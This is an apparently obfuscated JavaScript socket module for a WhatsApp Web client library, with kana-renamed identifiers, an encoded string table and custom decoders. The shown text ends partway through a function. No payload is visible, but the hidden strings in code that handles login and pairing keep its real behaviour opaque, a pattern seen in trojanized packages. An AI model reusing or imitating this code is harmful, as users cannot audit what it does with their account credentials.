import { Boom as さは } from "@hapi/boom";
import { randomBytes as をの } from "crypto";
import { URL as そつ } from "url";
import { promisify as はて } from "util";
import { proto as ふへ } from "../../WAProto";
import {
  DEF_CALLBACK_PREFIX as おか,
  DEF_TAG_PREFIX as すに,
  INITIAL_PREKEY_COUNT as にに,
  MIN_PREKEY_COUNT as へを,
  NOISE_WA_HEADER as ろな,
} from "../Defaults";
import { DisconnectReason as せけ } from "../Types";
import {
  addTransactionCapability as ふれ,
  aesEncryptCTR as んと,
  bindWaitForConnectionUpdate as しさ,
  bytesToCrockford as によ,
  configureSuccessfulPairing as こと,
  Curve as そし,
  derivePairingCodeKey as ねた,
  generateLoginNode as なを,
  generateMdTagPrefix as やれ,
  generateRegistrationNode as きこ,
  getCodeFromWSError as つき,
  getErrorCodeFromStreamError as ねね,
  getNextPreKeysNode as わふ,
  getPlatformId as ぬな,
  makeEventBuffer as よほ,
  makeNoiseHandler as ねに,
  promiseTimeout as かり,
} from "../Utils";
import {
  assertNodeErrorFree as へえ,
  binaryNodeToString as ぬく,
  encodeBinaryNode as ゆゆ,
  getBinaryNodeChild as なほ,
  getBinaryNodeChildren as たふ,
  jidEncode as にう,
  jidDecode as たて,
  S_WHATSAPP_NET as のる,
} from "../WABinary";
import { WebSocketClient as えそ } from "./Client";
var すは, やぬ, うし, ぬひ, なす, はね, をは, をへ, つな;
const なる = [
  0x0,
  0x1,
  0x8,
  0xff,
  "length",
  "undefined",
  0x3f,
  0x6,
  "fromCodePoint",
  0x7,
  0xc,
  "push",
  0x5b,
  0x1fff,
  0x58,
  0xd,
  0xe,
  !0x1,
  0x79,
  0x7f,
  0x80,
  0x6b,
  0x8a,
  0x8b,
  "on",
  0xa6,
  0x3c,
  0xb4,
  "id",
  0xb8,
  0xbf,
  0xc1,
  "me",
  0xc5,
  0xc6,
  0xdf,
  0xd9,
  0xe0,
  0xe3,
  0xe4,
  0xef,
  0xfd,
  ",",
  ":",
  0xf9,
  0x101,
  !0x0,
  0x107,
  0x10c,
  0x10d,
  0x10e,
  0x115,
  0x8d,
  0x18,
  0x3e8,
  "=",
  ";",
  0x125,
  "iq",
  "to",
  0xd8,
  0x141,
  0x148,
  0x149,
  0x155,
  "md",
  0x15b,
  0x15c,
  0x160,
  0x156,
  0x173,
  0x174,
  0x177,
  0x121,
  0x17a,
  0x153,
  0x185,
  0x18c,
  0x18d,
  0x18e,
  null,
  0x1a4,
  0x1a6,
  "qr",
  void 0x0,
  0x109,
  0x1b4,
  0x1b1,
  ")",
  0x1c2,
  0x4,
  "Q",
  ".",
  0x19e,
  0x1f4,
  0x1f0,
  0x186,
];
function ほの(さは) {
  var をの =
      'L8"Ax`:(/,nw[ZWRCY5Kmhi.NFTVPp_@g;c3|!Br1=}9^2<EQjqX7&O$IavtzH0uk%Sdy]U4>{)sDb6~lG#?*Mf+oJe',
    そつ,
    はて,
    ふへ,
    おか,
    すに,
    にに,
    へを;
  へら(
    (そつ = "" + (さは || "")),
    (はて = そつ.length),
    (ふへ = []),
    (おか = なる[0x0]),
    (すに = なる[0x0]),
    (にに = -なる[0x1]),
  );
  for (へを = なる[0x0]; へを < はて; へを++) {
    var ろな = をの.indexOf(そつ[へを]);
    if (ろな === -なる[0x1]) continue;
    if (にに < なる[0x0]) {
      にに = ろな;
    } else {
      へら(
        (にに += ろな * なる[0xc]),
        (おか |= にに << すに),
        (すに += (にに & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
      );
      do {
        へら(
          ふへ.push(おか & なる[0x3]),
          (おか >>= なる[0x2]),
          (すに -= なる[0x2]),
        );
      } while (すに > なる[0x9]);
      にに = -なる[0x1];
    }
  }
  if (にに > -なる[0x1]) {
    ふへ.push((おか | (にに << すに)) & なる[0x3]);
  }
  return ぬは(ふへ);
}
function にり(さは) {
  if (typeof すは[さは] === なる[0x5]) {
    return (すは[さは] = ほの(やぬ[さは]));
  }
  return すは[さは];
}
へら(
  (すは = {}),
  (やぬ = [
    "*WA>$<I<4vw$]Nf1,32)o6C<@R3>LA+p^.wgiM]]dazl(TB@yL",
    "j9I:X!.&LR+z?BxB|98Xz*0:rv[$OFd_1O_PctK=#O^hUFw",
    "sms/n|9(LS*/fGAF29/6Xvx5jR",
    "+{&$*tF(A,P],C4@1O0@P6S_VtHI<!f1",
    "OYMq*20lph)bzQc!z0b4T{L",
    '[13gL*|"',
    "c9vX0&k[b&QxS!,",
    '4}=VMqKK0Iq]EvZKimt/tvk[E[p(kR$ci4~Py>|v=%`!SZ"_2aP(',
    '#2,sT6zN;S/O}j"_<X8',
    'pyDpI>EKnm$FCt$=)I6x4~:UD/4d*zET?@^n8rDvw%DjAq!NB0e/5Bi"',
    "M@i(g7b(;a?FoA#Vhm4,Z",
    'O2/O,z6NFmJGaNj1@c4,=I%3Lu,Zi`]_oP@xwqB"',
    'I1s/])ZZd,MU^C"!{W3gE!j(>Zk<}Z"@3cHnq!T"!O8X8',
    "dPH(x)/NWub8]NRr^%0$365/fZYslNTPbX|nfa|_x",
    "e2!7Nq1Nc[wv3UCTv2zn",
    "ZR*bPEZGUk?UqW]@]0!)A&V3guPDATS5POF>Er}5nWzlu?|5]L",
    "l2F6otfctww>Lry@Vz!P%&J.|O;DFCk.KTA>d<z<7aqNc`",
    "8[d&#qR(gRxX{zx9r)+PtX&.cK*z=Cd5V4Ox",
    "ByvgQro<WR+bwR{K]!DqU0tEYRTZ>V(!",
    "OXy4a*O5OKB7^49F8uy)F1$8",
    'v4N6YB7<BvH{x?GV94EOByv1Aa2{JQ"5UA:$6]]aRu>8*A2T[<t/EbY8=mmX8',
    "FgixT6]aD%XDBvmVROyb;y]Z<I0U*NwF~{Vp+D33nm=AMxKczAEx",
    "K)s`J?hpQut78CSNIWI:f]4=,$TNDt!Fmm@jK",
    "Ca/VSzL",
    "1m`qzvKK$moFz?%.bcuD@Op&VY[mm4&3+Uv/w?Fp(",
    "`OOj9Ok_<R!{`|z.om&)#B5<QRQ{7ClV",
    ";!`$@tX(,W4U|VW",
    '.X+P)Bu3iZzl."',
    "X4qXa>N<)%V%N?3@_<r,TM8=:Kz3hz__2.)gw?+Y#,E{BZ*c]L",
    "<0zpiDXpg5L#@BocdQ(,P4%XY,pv2xhV?Q]T8*!E=mk{.A#P",
    "9[,X3sapca(~2QVp/3BxyQ=EdzMpP4yB",
    "r0B@7sHpAOWcQtRV5gM(Af7_(m={c#*P2.ODw]}7=%wHvZtP",
    'l{>{UGT"NYe/&zsT`9,_zU8K%a/Ha|H|Z8',
    "W[JO/)I1/ZV(~BAF!,oOi]tMvm2S_`@|p,47WB!a{v~UB!:",
    '.O9>TO3KKz`Cv!x9!AZ)+4:_cu1Do|V}|Oeb]&bp%[D|DtaP.gzpU~m"',
    "+0nblDQ<1m={z?X=~L",
    "Vy]nA>^10t{lol+=ft1jBjZF&Zuu|Ex9/4Q{TOo7,0ei8",
    "HW!):&F3k[QSXvvPxab@`$hpnW|",
    "iTdp{GF&w%(O.W_N;[/;*qAuaYlRoRjr^:;s~$e<3[",
    "EcPbx$@EJ0p>}!(@eAh$IvEskz$j{Q>BQ!a:[",
    'yyBjy~||E&tldBT=<0.P:c<[=v*[sBm1Dm47G$}<"O~uR"51La47uc=]#z$',
    "{IIjZaL",
    "ky?pj*NlMK|>vv]K",
    "fFTggt!a^I+)`!6TVc3>%&+p9wZs`*dYh)1O8*ifdK",
    "Cui7uc.=wYXPY>X=NTO@^Uk_y,M)Gxw",
    "R5*qarP[T0%UEA",
    "M{Kp0vDN/Y0h^?wr!Xi@d~x/IYqtvG0_;)8O8</|N%.m8|wF7L",
    '8zx@$#e75Kq{*AfC+m*T^U;(?O(Or"u|OWlO}#?]/v#zbQfiP4HnK',
    '{2,VA<JY;OIg9"z}Vp#/P?3(Y,e)IxN}kX,XAQD19wSU[AkY!:Vgn0p3bw',
    "z%D@Q*CvbIA~L",
    "408V=IL",
    "+Y6@?BX.CS)dMQh=/5=Vg7!ZK,thh|EV<0t/|s`]D/]xxA",
    ";RN_[)v5=Wtj?W<K*2p7J{@KA",
    'z!AgarPlphA"o4sT62COO!HsDW"OE"RTw586m]Jp<IedUZ%YA,A',
    "sI|$D$P|;[lG7AW",
    "&2%gy$L",
    'K[{Xxc=ECS%SYzCr~%Dpd~XpHWywRTnF)}>j=!Ol!K|]&F__uYCO1j"N#K',
    "AaF>Y]v)/vTY&xVYB,}Xv*%.#Rvjj>*i_<6jru__7K.mWH`9B!v/.6sXAOxyL",
    "5XKg8Qj3w%>8K#3_s@*TzrG3^&;DmEbVB%!79H`]pt9WdBXVIA^)Y",
    "]QrPg6NNI%4F&x~TjXf(TM[/cz=AEU+=RRBP%&uX~[R~8",
    "cyF6!E6)phZ~4tGV4.?&ucL",
    ";.+,WQ[fBk}0UjL.W<Y:{DL",
    "v%QVtXx_^WjDbx+p#QA",
    'yYr{[]S<[t!7Gx[K%:OP^IC"8S>3tWUKbPrPNE|7xkwv[Ad_I:.Pp7M8',
    'k{UDu*{=tm;~B"gYnpKp1O6c($/y(4RrimOPbD9ZuIf5yA',
    "$4qX[|&pzIO",
    "gp.xXI&Z(",
    '4wr{ycu3JW^7BjIP6PVg+2c_QaL_kR#c"p"',
    "i%9g*DV(Gu|]:T.PImC,h1U<pW6bmR=r",
    "H%9gzrP[b5Cy<Uo3javg7uR8|KlU8",
    "@A7pub!G|kKZc!wr&OX><!@uQ[jlQz%@s!!@Cah3@R9W8",
    "00:@V493;uqSp>OP)IY6EX}1q,%U``",
    'Mm^n4~__2t={9U"NE0cs}H=]8,.YmR9T$Ocbt~236&}',
    "#%%/!t3KOkklsRwB99sb:0L",
    "_)QO6Q.KY527.B(B",
    "aWz&+qXsl[",
    "1OtnjUbX!ZSw8",
    'o/@7V?cf0I.Y}ZtY/gaXI~`]Bkwy1E?cYz?qj!7"',
    "[[;OxQI)g5W!x4o}/4y`",
    "_z>j+t}_TWr",
    "~{UPX#L",
    '<%5gfM75w0%lV#WT"Syn`)sMz0kurBwK)ym$o6AG5z,%u#qczQ]4mDL',
    ":98s^#,=_RdlLCZT$%i;P1PkDIkt)]T}QA[p]$%3$m;YRTqVDW_$&>Cv(",
    "S2N,S0RZ,nn!8*3_<[UD}sJa)W+)m|u_wy~7!HXZ^w9",
    '{@2n(0>:IvJ)1xA_w<>XzX57uuzgl3OPxS07jX/Uk[b/%xhPf}a:m]q"',
    "yOEPt<d8",
    "([Vg#arKja4u8",
    '@pC,Z|v<3KA6~"xYS}x`',
    'B%wbx$v"rkFV2QG1PO<,CDP/nWwV0Z}Kiy(6{zn5kzM&~W&3',
    "|!zpy&o0TWoK0GwT#Qx`2#8Z90]FOZ&c|9rjoD2u>m3",
    "9.?&fDYF.kkFgVMcxS>{+q&s?a.vqZa}Q4(_LvL",
    "@,O7>~n<x,^t{>{@l00(tvs=Eh",
    "6Px`^uFE*,",
    "fXiPf2=s_58CHQ^KG:*qp",
    "vW*pKqdXnYm>]QnBw!g{@tdXAz=tF|}B{t&)cHU5(nJbG]8YaAA",
    "#%Tgb2wF9W2W:Hsr,j+Oj!gNVYm@Hx%.|aybY",
    "fFL;h7h(<R{p&>cY5z7$N6i/D0~<ATf=}0<PNaL",
    '5XU$)0"U;a&lsAg5iz7b)a~awWN$*EYrHA)gZ',
    'O.U$U|LNj5]xW!2K<mm)LQ^[z%eT3v7VQcE{wBmfQ[V$v]Qc|y"',
    'wjHPjjW"6&abDVu_oc$j"z|_8[1@PAe3m427xfV(@h:~CRCr*t=_u~L',
    "cc:iP|j5{WLz<)ZvU(",
    "*cj|MX)5",
    '{=}BBQ"',
    ")aW]Lf;UGWBN5#G",
    'Q%D4?tN"',
    "yR<t+MGEwh:V~p+O<x",
    'gi"_t#hTm^fHG8g$=zQF',
    "[i5uB#%,",
    'Ir81,%x*W"J]m7p[]H&1$_Y,',
    '"&B=+ai]9',
    "]{.Fg",
    "f&S_naA]aQPB>gwd7O&1Z",
    "rr%NDqnTt^hVS6v3/zCu*qHWTG",
    '8&V*6axJi"h/28wC/_A',
    "n&|3Eu2E@G@",
    "xREN^@H$dvdhn^lCp_T![m]*9",
    "r{]F[mL,yhq?]e)L;UtNS",
    "A%31{",
    '^u^/[CI[PIw)`*ZCMCl7/^vNg:N2#Bu`uv|23?Fkk,wcud)C(#`~zg,0uFy2,`Zv~dWk^Z7yz<MgzMA`lSP+%W,/F]N2Q05@Id!G7aq3XIKM>M:@L*0GDZ;TuFhD=&i`MC;xDZLqir>]&MHK>[p+$6**xIz)[`5@9vaW//}N]#j.S4.$9*YWVgnqXFozKPhB{4q~g/<8aF])JMKApXq1F/lU_tG4JM@A=["+YW<8`<w)5syoR2{7cNxCmR|rVsIS&*<~^g=AgR".e5@Aa0aWfZpq{r%TDV@AKaJT~aPyur!rM%WCe&m9IJbLirR.|PoAS0aWfZpq{r%TDV@A^&p+DZ&q]#5))OzE|s7!:gq3]#9uv5ZC9*/7ENdkk,or_',
    "Y:&o^=T,",
    "LijNIuG,",
    "f&e![mVE0J",
    '"!a_j',
    '~HoXm5y8J[e|xp3asn^ePmLjZh@@4Txce;T3"]^t[7T',
    ".MiDbU:hihg&;",
    "cHb5Y!gtFy)",
    "M_]F",
    "trV*;Mg,F<Rl&dj",
    "#tj!wsqi",
    "H%)`]<Y",
    "W_oL|2GWb40A<R",
    '__d#m"#<kq',
    "<V/!ac3oD@A",
    'gi"_t#hT9',
    "+rJo$n@T=h$Vt0G~e&A",
    "IrpFOb&]9",
    "0i>}bY!l<:c0DSF",
    "$i3Fr(}$qQ0_aR",
    "/&81jas",
    "Ir<mB",
    "trv!S",
    "5_c`N#d,",
    "zoLg0iewF[VLcjvJ>g.I|",
    "a26IqKdQ6Qg9$",
    "7;Lg0iewF[VLy3c)0XbI",
    '!fR[^"`>vpQ}o6',
    "kL=1/",
    "ls`rx$J",
    "`zZ$^+J",
    "_GC(Wqy",
    "+:5e",
    "`l,e",
    "+:5e.j/j`~",
    "+M1&8)!",
    "+MDd",
    "#UCTW]Wp86jM2g<U>8Dd?4GA)n",
    "2HMTej|:",
    "m_TpC#r|*Z~TUY5bEp/Kk",
    "?c$K>8iq$qp,H",
    "{gTpC#r|*Z~T9}U0CzdK",
    "ti2V}c$",
    "P~MPVc$",
    "Ti[PSI$",
    'I"q{}J&UP',
    "O97O",
    ";A/bnva",
    "wEaw",
    "OG3Obva",
    'dAgO"ta',
    "$^h`>.7",
    ';U"_t#hTDHB"6[`dp_81S',
    "T:zA|YBHzH/4M",
    "nc(/Chq5e)=(@gusCR}A",
    "(Noj*",
    ">Y[>eS4",
    "H=4H",
    "@jx>K54",
    "Rw$*mzx$",
    "x+5(v2tJMC",
    "8S*RvM`kP",
    "t3Dt",
    "`WN*Z",
    "4.O4]FD",
    "+*s4=2D",
    "sf?X9;,",
    "]i%HzLP",
    "Rq`2",
    "PQP2",
    "=~?N@=&l}<whaR",
    "y%hN;ui]Q<_",
    "!YEk7#d5",
    'uzFqP&"n&v)^]sD$o."k',
    "o[hpmus<)}}_>",
    "t$?)h",
    "W[!f^&,7n",
    "]b|qLmc^X^",
    'M,WDV;}i)X[4:"BaUz5',
    "4$K)TU.5",
    "$M]pb&M5",
    "bbK)TU.5",
    '"[n)h;x',
    '{zFqP&"n&ve',
    '{zFqP&"n&v[41`NRh>ZlRmB5VYp',
    ':[!fh;Q]JT*Wbs@B>p"k',
    "Q,;)+;;j+*",
    "Q,V+1",
    'Q,*(0)=yXvX[`/=swZ1tN$}QHqb#_yvS`cGbl$"[[kb#]&Pk{Fx',
    "E[|U}",
    "9WJ@5",
    "QWCU(2)MG:5q:Y?v",
    "4$JlQgrin",
    "4RU+<fe5a}e}7dh%",
    "fRU+<f!Bw^1<~S7",
    "|T[kb#d5",
    "00`(Lm<i~",
    "$M]pb&IcBFW_>",
    "1R1!",
    "$@_[ySa",
    "S#X7]Sa",
    "jROf#.}:k",
    '[q"4A',
    ")2^5",
    "dmtL4q<:k",
    "nJnL",
    "dm$[pSa",
    "5Jb44qa",
    '8&V*6axJi"h/=R',
    "8@eg!",
    "*Y~lj`P",
    "!s[qeUgN]CN,T!iJ@$]$7`P",
    "!s~$q`:m",
    "MY~$V",
    "np;yO`P",
    "RA>B#",
    "1M=)x",
    "np;yO`Kx27vs%iH",
    '!s[qeU~~h>9r*i"ARA>B#',
    "nu0=Y",
    "Uxz;c_jy;/$x{J4`[@Uo23W!=!W=S4^",
    'rrku:?c[!"WH$R',
    "lPiA`",
    "4GdbH9u",
    "HT&*Vcu",
    "X<#OoCu",
    "5j#s)0v",
    "N&X09wm",
    "LyaM",
    "<,AM",
    "RefFDvwD$r",
    ".fD*p",
    "}b}*",
    "382m,Xv",
    "miU?Mkl(#",
    "^wJ*c0`D#",
    "2@,<;",
    "O/|UX",
    "R@5cWsv",
    "@@=FUQv",
    "p/e&9qA$g]d",
    "Y::&4(G",
    "$I.SV:aF",
    "$ID&}+G",
    "hxzSXRkX*ep=[fg<WdTvQfG",
    "8&9uZ#s",
    'SVXL"H{)(mnX<@/$&>F}w*,_;jlrAk@',
    "7OluZ",
    "d6>x*$.vg{F>.uYc_6%f!9)",
    "d6>x*$.vg{F>GVI+2xPb]",
    "lHnydPyEAQ6oV+7cZcT:oN)",
    "ypFyz$)",
    ",%0y6M)",
    "e}T:X",
    'vH"y?,U*a',
    '!xTCt/"*;o',
    "!xTCt/H:+[%",
    ':8N:?"W',
    ".mvsl",
    "d6>x*$.vg{F>X`&wPA=f]",
    "d6>x*$.vg{F>O",
    ")rkIk?oQZ.F>I27p]O",
    "PA=f]",
    "c~o_42lx",
    "x)ArfJS%5b",
    "=O^Uf5?i3",
    "5_|0)m{t^<",
    "5_|0)mr*dv&",
    "_EQ)P$!xgSOQLUV4*)/C^",
    "X&TCBYqITI)ZN",
    "?#Q)P$!xgSOQ>9LMPvWC",
    ".%|*Z",
    'b?%b"IP',
    "L7~bkWP",
    "v)*P0Gi{W",
    "qB4q",
    '~h|{"',
    "<b3<L84",
    "hYyh",
    "W>`36cy",
    "ClPE",
    "RxOE^v<(N",
    '/n"K(>BMJta"*TMLMFfbGrJf',
    "<|[_24CH[HK~F",
    'ql"K(>BMJta"947I3F',
    "2KANV>cf",
    "_W_z",
    "(|y2*rQ",
    "2>`U3",
    "RxOE",
    "rCgKGrQ",
    "p)VC",
    "FtiC&T>3Y",
    "ZjZC",
    "qFar{",
    "K748u/z",
    "SM,r+Rz",
    ',0"rtWz',
    "e<jpd[$",
    "=Yjp7.$",
    "i<69%Zu<_be[r[#sQ:2Gu.!@tbaXM]1VLM",
    "9WN21",
    "yx._vy?o<Rt~G`yL0L._>y|%k*&P7C;9ClOEm]K(CH",
    "vYMT=[$",
    "[hp.<[$",
    "77~X*G(vz",
    "TWsdl",
    "vQS`",
    "!{I9dW|,)",
    ">7>9",
    "xkxA",
    "sfr]i+E",
    "]:SqQ",
    "s)?W",
    "+PaV.+E",
    "jeDAq:7/M",
    '")_{jL!J16g*i.OIqebq^<%Sl*pHc',
    ">jJx",
    '")MU54In',
    "TV7p~TM+Z}yojaCSAc",
    "<OPo@=<**J,lMR?g8GZoqas",
    "Y:&15qzJ&J_Vx",
    "[i5uB#_E2G@",
    "Um*}s76",
    "11._s08oKpFmo1",
    "z!h3X2?cA)A2(E4j.=",
    "`1u<.",
    "CwtDQ",
    "Um*}s7TQVcNXGHA",
    "}1}D",
    "#YFr)76",
    "r+j<.",
    "#[>3",
    "7wB_/76",
    "dhfD<+]t;",
    "XdZqDM@g4CsyA*h:11c<<K0g3^wr=",
    "ydO}",
    "~Y;P9+6",
    "dhpD~2Sllccyq43:jhe",
    "Vbv<.P_g.ZCU=]X?M_aPpqgtBL>{p[]!<hfD",
    "*mO<.",
    'XdZqDM@g4Csy)/Sw@dZq}MRTA)A2"BBJdhpD~2Sllccyo1U$Cw]l~2VgEf"~=',
    "dhpD~2Sllccy#HZ!J[@qh2;.Ga6Hf[@J94z}",
    "wh+P&++Q&>",
    "94z}T0/`",
    "dhpD~2SllccygBbGsL8_NPU@z)",
    'dhpD~2SllccygBbGsL8_NP_tBaT2=/C"',
    "XdZqDM@g4Csy)/Sw@dZq}M0g:fl@=",
    ">>:{B~2=1M3J=>",
    'LJXcB"Q',
    ">>:{B~2=wA/MTyyP0>>oHDy*(K547",
    "Ny`cC~d*",
    "9?,o@he*",
    "@+@(",
    "UOzoA67",
    "6=&nl67",
    "Bbi1&Vw*9",
    "/`M(|sY49",
    "%)E@",
    "Tr{=YbLt`",
    "b&V=ins",
    "b&0F",
    'b&V=inN&zJQug7`z8APo^=T,OhB"FpE~_g}_Z',
    "=~B=N#s",
    ';U"_t#hTDHB"C%:[WzS_lbht^<',
    'gi"_t#hTDHB"Xl6CtrW1',
    ")`y0KukJiGpV7{{[UQA",
    'qEh.X0T%I^}h+=|pnes.1uTX!kN)X"WCux&y37N',
    ")|xLQgeJxJ.2Z",
    "UBh.X0T%I^}hV1]+XSnL",
    ")`:ZMfiko.{V3Lp[A[)oF(^W2h%u[d^[",
    "t:I5<as",
    "5#[oS",
    "3r^oSuD,",
    'RRS_>NttW"}7$R',
    "3rs!",
    "M&ZoZ",
    "n>?^2??T2#",
    '6:"*o.UH',
    ">>Au;]u,Ub",
    ',K"Fg`oM',
    "@V)F)",
    "SljhA?^BDcgX/UR&fFn2A",
    "TC${g?Lo^s!U800",
    "Ih=Q2?`H",
    "tgfhZ,<",
    "xV{92?[vXymi~mq`;zo![?$wksy",
    'K/61JY^o6o"%D',
    '"B}TJ)wg<x',
    "l>8jF?$wu",
    '""kGK{G%i;',
    "Tyvbv!9",
    'f"hI`',
    "|MBY+",
    'u"1Ik*|BTD#1`&[!mSwUh',
    ")`:ZMfwb/v+@gp4O/!INjaY,",
    "rrjNMes",
    "uutWMvB>fpoa8EG*Q9doQ",
    'vd"YbU0p',
    '"KeS*hM',
    "Z~rlvUM",
    "=@NI[",
    "71~lBFT]k9",
    'ff<#v|)A4&{ZmFBg9d~WocXsd6c=9j#@Dd5S*h^MUlSQS9(V")Ufy@~#CW@e&qjV`!L>K0#@0IbU4;g9.4qq',
    'EgwS"',
    'Z~rlvU]"c9^31}y',
    "+O6#znEw&T_6[G=0rxCW<",
    'o#*"^rR;sT<6p',
    ".2T=!",
    "&l]=!h1",
    "!+Vxm`A",
    "&b^=}>%bg*R.!kOpapJX",
    ")`@e_q0Juh)ex",
    "%!PoS8G,",
    '/"WB)F5!nAOozNqa(4M(M6qqCx/00',
    "A.w?X",
    "2Hrg^#<Xb|L@aNG",
    "2Hrg^#S",
    "@4tg",
    ")[6%T#S",
    "e4tg",
    ")Zo(f,S",
    "Jj7vz{Qy~",
    "48o()FAwx>OoV:c`rU9vf",
    "48o()FAwx>Oo0",
    "i@WBV",
    "`rIV#5E(h0",
    "!%)S$",
    ")`@eaa@tQh6qEgIOm&A",
    "zitNS",
    "Y:&o4bL,#<>?LZp[!xSoqas",
    "3r9u~md,",
    "O;ezHm?,e,A3C",
    "/;eWx!Vqw%RhVrld*CO8",
    "F8:W7",
    ")`QD4bWM@GpVx",
    "ej6EkP~D",
    "s2)nZl,+GI0)sCqkWkZ9Rl4",
    "8Oa.9Xm3a3nUc",
    "WVYb+",
    "ZOH9!r4",
    ")`:ZJMwb2hX=28GO3QCuE8i]i<T@X#;O",
    "|^Y!r(4kW<3@:{[y]rPo?I(EUGk^]6Wd)QA",
    'S{Y!r(ttW"}7"{,zuz&1EMg,',
    ")`:ZJMwb7Jx_x6Wd3Xn_N#.*uh^",
    '!+s!](DtH0E?X#9z("mlN#BtY+HVzR',
    "Y:&o^=qVxH{",
    "giv!o#|T9",
    "!+s!](Dt?6>%fdvL",
    "git5nas",
    "D4.R",
    ")`:ZJMwb#<z5G8JOZ{Po^=T,",
    ")Q_N1PqE@GB@28Q",
    "s~;fp9nsXB)cErx",
    "4Tr(>/Q",
    "w63=9ZBwt}u&0+",
    "LJ`8`",
    "y$/v3",
    "kJ^Ui0b3?f~q(S}",
    "kJ^Ui0_",
    "Sr*FL^<Jn+",
    "i$H[}_G(",
    "wo]V^",
    '*6<r"0w]v;.<3g!mCB>nU',
    '*6<r"0w]v;.<b',
    '*6<r"0w]!QO7b',
    '^cMkF(9"lSXR:!EoW5o(&tPj!;xJ)ssm@rB',
    ")`:ZJMwb7Jx_x6WdFx",
    "!+s!](Dt`",
    ">Av!.u/TH0",
    'DUx_.u9aW<iHJd_OMGCu))(Ei",_[dI~_g}_6as',
    "n~u=$}s",
    'n~u=$}/TvD%uX#;OTx4uinN&dv"}nrFdc0t5xei]9',
    "hzT!3",
    'b5<"MZ+TukP<=XSG(NU>V',
    ']!Oc,8;MLtvQ$Si@s0@8r_hYSkzl4jjGE"N',
    "/&81ja]3?JX%~pQ",
    "*_a&72%,",
    "S,3Nw",
    'Zm#_?JBlF1Vh"1$ZDKHT',
    "T,Tp",
    "{65C_<ZUh4",
    "#dx74JG",
    "%e!?KsG",
    "3TGZ>",
    "@^Nv>x<",
    "DlNvy~<",
    "5^:J2&)^(S@x.xAYX[m!++L}>U1UlKY3>$})JgcRXS0PmwEufIUm$5jH~V",
    "l_^o/ed,",
    ']{.F{@61i"D',
    "*g!_lb:](<//36;Om&pF",
    "P_|*B",
    "+rJo$n@T=hUVWdT~+r|3ves",
    "3{|*z;s",
    "yRT!D7H]:@ge36oLFx",
    "yRT!D7H]h^u7c{|On4|*Z",
    "trv!E:l$:@ge36oLFx",
    "trv!Q5ETW<",
    "[i5u*qD,",
    "4OW1",
    "5OlVt#@,=hh}U7LTa&}_B",
    'Z%R=lb+,F",6vr5O',
    'Z%R=lb+,F",6vr5Oyiu3$n/ty"=*n^fC5g&o5?s',
    "3rioo#ASj^+@S6WdV!#!B#s",
    'yRT!D7H]f2B"FpE~_g}_9{XTy<hVx',
    "trv!UpV({21_M{GO",
    "OgAoQ5SWW<",
    "Fiku3#3apH:",
    '"RRDT6:ksYt2jFi16Xb"n',
    "QaX/$#!KXKO78",
    "?AdgN",
  ]),
);
function てろ() {
  var さは = [
      function () {
        return globalThis;
      },
      function () {
        return global;
      },
      function () {
        return window;
      },
      function () {
        return new Function("return this")();
      },
    ],
    をの,
    そつ,
    はて;
  へら((をの = void 0x0), (そつ = []));
  try {
    へら((をの = Object), そつ[なる[0xb]]("".__proto__.constructor.name));
  } catch (ふへ) {}
  くわ: for (はて = なる[0x0]; はて < さは[なる[0x4]]; はて++)
    try {
      var おか;
      をの = さは[はて]();
      for (おか = なる[0x0]; おか < そつ[なる[0x4]]; おか++)
        if (typeof をの[そつ[おか]] === なる[0x5]) continue くわ;
      return をの;
    } catch (ふへ) {}
  return をの || this;
}
へら(
  (うし = てろ() || {}),
  (ぬひ = うし.TextDecoder),
  (なす = うし.Uint8Array),
  (はね = うし.Buffer),
  (をは = うし.String || String),
  (をへ = うし.Array || Array),
  (つな = (function () {
    var さは = new をへ(なる[0x14]),
      をの,
      そつ;
    へら((をの = をは[なる[0x8]] || をは.fromCharCode), (そつ = []));
    return function (はて) {
      var ふへ, おか, すに, にに;
      へら(
        (おか = void 0x0),
        (すに = はて[なる[0x4]]),
        (そつ[なる[0x4]] = なる[0x0]),
      );
      for (にに = なる[0x0]; にに < すに; ) {
        へら(
          (おか = はて[にに++]),
          おか <= なる[0x13]
            ? (ふへ = おか)
            : おか <= なる[0x23]
              ? (ふへ =
                  ((おか & 0x1f) << なる[0x7]) | (はて[にに++] & なる[0x6]))
              : おか <= なる[0x28]
                ? (ふへ =
                    ((おか & 0xf) << なる[0xa]) |
                    ((はて[にに++] & なる[0x6]) << なる[0x7]) |
                    (はて[にに++] & なる[0x6]))
                : をは[なる[0x8]]
                  ? (ふへ =
                      ((おか & なる[0x9]) << 0x12) |
                      ((はて[にに++] & なる[0x6]) << なる[0xa]) |
                      ((はて[にに++] & なる[0x6]) << なる[0x7]) |
                      (はて[にに++] & なる[0x6]))
                  : ((ふへ = なる[0x6]), (にに += 0x3)),
          そつ[なる[0xb]](さは[ふへ] || (さは[ふへ] = をの(ふへ))),
        );
      }
      return そつ.join("");
    };
  })()),
);
function ぬは(さは) {
  return typeof ぬひ !== なる[0x5] && ぬひ
    ? new ぬひ().decode(new なす(さは))
    : typeof はね !== なる[0x5] && はね
      ? はね.from(さは).toString("utf-8")
      : つな(さは);
}
function とた() {}
function てつ(さは, をの = なる[0x1]) {
  function そつ(さは) {
    var をの =
        '"(5}=1^@87{LG$9cghpAjFH*t4)r~RUiBKqO;!o?v/[aC3:+N6Y0.V]2bs_P&#ny`W,SzuDQJEfmT|MklX>w%IZ<xde',
      そつ,
      はて,
      ふへ,
      おか,
      すに,
      にに,
      へを;
    へら(
      (そつ = "" + (さは || "")),
      (はて = そつ.length),
      (ふへ = []),
      (おか = なる[0x0]),
      (すに = なる[0x0]),
      (にに = -なる[0x1]),
    );
    for (へを = なる[0x0]; へを < はて; へを++) {
      var ろな = をの.indexOf(そつ[へを]);
      if (ろな === -なる[0x1]) continue;
      if (にに < なる[0x0]) {
        にに = ろな;
      } else {
        へら(
          (にに += ろな * なる[0xc]),
          (おか |= にに << すに),
          (すに += (にに & なる[0xd]) > なる[0xe] ? なる[0xf] : なる[0x10]),
        );
        do {
          へら(
            ふへ.push(おか & なる[0x3]),
            (おか >>= なる[0x2]),
            (すに -= なる[0x2]),
          );
        } while (すに > なる[0x9]);
        にに = -なる[0x1];
      }
    }
    if (にに > -なる[0x1]) {
      ふへ.push((おか | (にに << すに)) & なる[0x3]);
    }
    return ぬは(ふへ);
  }
  function はて(さは) {
    if (typeof すは[さは] === なる[0x5]) {
      return (すは[さは] = そつ(やぬ[さは]));
    }
    return すは[さは];
  }
  Object[はて(0x64)](さは, はて(0x65), {
    [はて(0x66)]: をの,
    [はて(0x67)]: なる[0x11],
  });
